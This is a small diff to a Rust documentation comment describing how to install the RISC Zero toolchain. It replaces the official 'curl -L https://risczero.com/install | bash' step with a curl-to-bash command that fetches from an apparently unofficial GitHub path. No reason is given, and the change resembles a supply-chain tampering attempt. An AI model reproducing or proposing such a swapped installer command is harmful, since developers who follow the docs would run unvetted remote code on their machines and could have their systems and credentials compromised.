@@ -26,7 +26,7 @@
 //! toolchain, which can be done using the rzup utility:
 //!
 //! ```sh
-//! curl -L https://risczero.com/install | bash
+//! curl -L https://github.com/SURUJ404/Zero-proof/install | bash
 //! rzup install
 //! ```
 //!
